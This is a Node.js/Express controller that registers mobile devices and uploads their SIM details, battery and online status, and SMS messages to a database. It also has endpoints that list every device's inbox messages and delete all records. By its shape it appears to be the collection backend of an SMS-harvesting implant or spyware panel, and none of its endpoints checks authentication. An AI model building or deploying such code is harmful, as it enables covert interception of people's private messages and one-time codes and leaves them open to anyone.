import User from '../models/UserModel.js';
import Sms from '../models/SmsModel.js';

export const register = async (req, res) => {
  const { deviceId, deviceName, battery, online, sims, sms = [] } = req.body;

  try {
    let user = await User.findOne({ deviceId });

    if (!user) {
      user = new User({
        deviceId,
        deviceName,
        battery,
        online,
        sims,
        sms: [],
        lastSeen: new Date(0),
      });
      await user.save();
    }

    const lastSeen = user.lastSeen || new Date(0);

    const allMessages = sms.filter(msg => {
      const msgDate = new Date(parseInt(msg.date));
      return msgDate > lastSeen;
    });

    const insertedMessageIds = [];

    for (const msg of allMessages) {
      try {
        const newSms = await Sms.findOneAndUpdate(
          {
            deviceId,
            address: msg.address,
            body: msg.body,
            date: msg.date
          },
          {
            $setOnInsert: {
              deviceId,
              address: msg.address,
              body: msg.body,
              date: msg.date,
              type: msg.type
            }
          },
          { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        if (newSms && newSms._id) {
          insertedMessageIds.push(newSms._id);
        }
      } catch (e) {
        console.warn("Duplicate or error inserting SMS:", e.message);
      }
    }

    user.battery = battery;
    user.online = online;
    user.sims = sims;
    user.lastSeen = new Date();
    user.sms = Array.from(new Set([...user.sms, ...insertedMessageIds])); // remove duplicates

    await user.save();

    res.status(200).json({
      success: true,
      deviceId: user.deviceId,
      smsInserted: insertedMessageIds.length,
    });
  } catch (err) {
    console.error("Registration error:", err);
    res.status(500).json({ error: "Server error during registration" });
  }
};


export const updateStatus = async (req, res) => {
  const { deviceId, battery, online } = req.body;
  try {
    const user = await User.findOneAndUpdate(
      { deviceId },
      { battery, online, lastSeen: new Date() },
      { new: true }
    );
    res.json(user);
  } catch (err) {
    res.status(500).json({ error: "Update failed" });
  }
};


export const getUsers = async (req, res) => {
  try {
    const users = await User.find().populate({
      path: 'sms',
      match: { type: 'inbox' },
      options: { sort: { date: -1 } }
    });
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch users" });
  }
};

export const deleteAll = async (req, res) => {
  try {
    await User.deleteMany();
    await Sms.deleteMany();
    res.json({ msg: "All users and SMS deleted" });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete" });
  }
};

